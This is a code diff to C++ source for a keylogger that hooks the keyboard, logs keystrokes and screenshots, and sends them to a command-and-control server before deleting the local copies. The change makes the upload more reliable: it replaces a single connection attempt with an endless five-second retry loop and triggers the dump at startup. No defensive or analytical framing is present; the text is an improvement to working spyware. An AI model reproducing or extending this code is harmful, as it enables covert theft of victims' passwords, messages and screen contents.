@@ -28,7 +28,7 @@
 void kill()
 {
 	KeyboardManager::GetInstance().UninstallHooks();
-	
+
 	for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
 	{
 		std::filesystem::remove(entry.path());
@@ -42,7 +42,7 @@ void WriteKeylog()
 {
 	if (KeyboardManager::GetInstance().keylog.empty())
 		return;
-	
+
 	if (IO::WriteLog(KeyboardManager::GetInstance().keylog))
 	{
 		KeyboardManager::GetInstance().keylog = "";
@@ -72,14 +72,17 @@ void SaveScreenshot()
 // dumpTimer Handler function
 void DumpCache()
 {
-	// Open connection with comand and control server
 	ClientSocket ccSocket(CC_HOSTNAME, CC_PORT);
-	if (!ccSocket.IsActive())
+	while (true)
 	{
-		IO::WriteAppLog("Connection to " + Utils::ToString(CC_HOSTNAME) + " on port " + Utils::ToString(CC_PORT) + " failed");
+		// Attempt to open connection with comand and control server
+		ccSocket.Connect();
+		if (ccSocket.IsActive())
+			break;
 
-		ccSocket.Close();
-		return;	// Files will be left alone
+		// If connection fails, then try again
+		IO::WriteAppLog("Connection to " + Utils::ToString(CC_HOSTNAME) + " on port " + Utils::ToString(CC_PORT) + " failed");
+		std::this_thread::sleep_for(std::chrono::milliseconds(5000));
 	}
 
 	try {
@@ -97,7 +100,7 @@ void DumpCache()
 			else if (res == SUCCESS)
 			{
 				std::cout << "Sent [" << path << "] Successfully" << std::endl;
-				IO::WriteAppLog("Successfully sent file [" + path + "]");	
+				IO::WriteAppLog("Successfully sent file [" + path + "]");
 
 				if (std::filesystem::remove(path))
 					IO::WriteAppLog("Deleted File " + path);
@@ -140,7 +143,13 @@ int main(int argc, char** argv)
 
 	// Create and Start Dump Timer
 	Timer dumpTimer(DumpCache, DUMP_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
-	dumpTimer.Start(true);
+
+	/**
+	 * Run the callback function on startup, which will repeatedly
+	 * attempt to connect until dump is achieved, then timer will
+	 * wait specified amount of time before attempting to dump again
+	 */
+	dumpTimer.Start(true, true);
 	IO::WriteAppLog("Dump Timer Started");
 
 
